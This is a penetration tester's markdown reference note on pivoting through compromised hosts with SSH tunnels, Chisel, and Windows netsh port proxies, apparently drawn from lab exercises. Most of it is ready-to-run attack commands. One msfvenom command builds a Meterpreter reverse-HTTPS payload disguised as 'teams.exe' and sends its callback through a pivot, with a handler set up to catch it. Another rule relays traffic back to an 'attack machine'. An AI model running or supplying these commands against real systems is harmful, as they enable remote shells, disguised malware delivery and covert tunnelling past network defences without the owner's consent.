---
tags:
  - knowledge-base
category: misc
---

# Port Forwarding

## Overview

Reference for the different ways to forward/tunnel traffic through a pivot host - plain SSH local/dynamic forwarding, forwarding a Meterpreter session over SSH, Chisel, and Windows' built-in `netsh` port proxy.

## Commands / Usage

### SSH - Local Port Forwarding

```bash
ssh -L 4444:localhost:8080 target@10.10.10.10
```

Opens port 4444 on localhost and sends traffic through that port to and from port 8080 on the target machine at 10.10.10.10.

### SSH - Dynamic Port Forwarding

```bash
ssh -D 4444 target@10.10.10.10
```

Opens port 4444 on localhost and sends traffic through that port to and from the target host at 10.10.10.10 (SOCKS proxy).

### Forward RDP From an Internal Machine Through a Pivot to You

```bash
ssh -i rootssh -L 13389:172.16.8.20:3389 root@10.129.229.147
```

### Port Forward a Meterpreter Session Through SSH

```bash
ssh -i rootssh -R 172.16.8.120:4445:10.10.14.5:5555 root@10.129.229.147 -vN
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https -f exe -o teams.exe LHOST=172.16.8.120 LPORT=4445
```

```msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 10.10.14.5
set lport 5555
run -j
```

### Chisel

```bash
chisel server -p 5555 --reverse
```

*Chisel client is run on Windows with `chisel.exe`*

```bash
chisel client <server ip>:5555 R:socks
```

### Netsh

*Create a listener on a Windows machine to listen on port 443 and send traffic back to the attack machine*

```PowerShell
netsh.exe interface portproxy add v4tov4 listenaddress=(my ip) listenport=443 connectaddress=(attack ip) connectport=5985
```

*Show all current port forwards*

```PowerShell
netsh.exe interface portproxy show v4tov4
```

*Delete the port forward listening on port 443*

```PowerShell
netsh.exe interface portproxy delete v4tov4 listenaddress=(my ip) listenport=443
```

## Related

- [Chisel](../../Tool%20Box/Chisel.md)
- [Sshuttle](../../Tool%20Box/Sshuttle.md)
- [Socat](../../Tool%20Box/Socat.md)
